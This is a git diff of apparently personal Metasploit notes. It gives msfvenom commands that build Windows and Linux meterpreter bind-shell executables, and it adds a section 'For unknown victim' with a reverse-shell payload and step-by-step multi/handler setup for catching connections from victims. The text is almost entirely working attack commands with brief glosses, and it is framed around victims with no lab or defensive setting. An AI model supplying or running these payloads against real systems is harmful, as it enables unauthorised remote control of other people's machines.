@@ -1,3 +1,6 @@
+## This windoows/meterpreter/bind_tcp payload is used when the victim is known...
+
+
 1. msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f exe>pay.exe -> It makes a payload for windows with meterpreter bind shell and saves it as pay.exe
 
 2. msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f elf>pay.elf -> It makes a payload for Linux with meterpreter bind shell and saves it as pay.elf
@@ -28,4 +31,25 @@
 
 15 . help -> It shows the available commands in the meterpreter session, which can be used to interact with the target machine.
 
-## this windoows/meterpreter/bind_tcp payload is used when the victim is known...
+
+
+
+
+## For unknown victim
+
+1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe>pay.exe -> It makes a payload for Windows with meterpreter reverse shell and saves it as pay.exe
+
+2. mafconsole
+
+3. use exploit/multi/handler -> It uses the multi/handler exploit module in Metasploit to handle incoming connections from the payload.
+
+4. set payload windows/meterpreter/reverse_tcp -> It sets the payload to windows/meterpreter/reverse_tcp to match the payload created earlier.  
+
+5. show options -> It shows the options available for the exploit module, including LHOST and LPORT.
+
+6. set LHOST <kali-ip> -> It sets the LHOST option to the IP address of the Kali machine, which is where the payload will connect back to.
+
+7. set LPORT 4444 -> It sets the LPORT option to 4444, which is the port that the payload will connect back to.
+
+8. exploit -> It runs the exploit, which will wait for the target machine to connect back to the Metasploit handler.
+
